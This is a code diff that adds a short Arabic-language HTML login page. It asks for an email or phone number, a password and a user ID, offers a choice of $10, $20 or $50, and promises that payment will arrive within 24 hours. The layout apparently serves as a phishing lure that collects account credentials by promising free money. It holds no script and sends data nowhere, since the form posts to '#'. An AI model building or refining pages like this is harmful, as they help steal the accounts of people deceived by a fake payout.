@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <form class="login-form" action="#" method="POST">
+        <h2>تسجيل الدخول</h2>
+        <input type="text" name="email_or_phone" placeholder="البريد الالكتروني أو رقم الهاتف" required>
+        <input type="password" name="password" placeholder="كلمة المرور" required>
+        <input type="text" name="user_id" placeholder="الإيدي" required>
+        <select name="amount" required>
+            <option value="">اختر المبلغ</option>
+            <option value="10">10$</option>
+            <option value="20">20$</option>
+            <option value="50">50$</option>
+        </select>
+        <button type="submit">تسجيل الدخول</button>
+        <p class="thank-you">شكراً لك! سيتم تحويل السداد خلال 24 ساعة.</p>
+    </form>
+</body>
+</html>
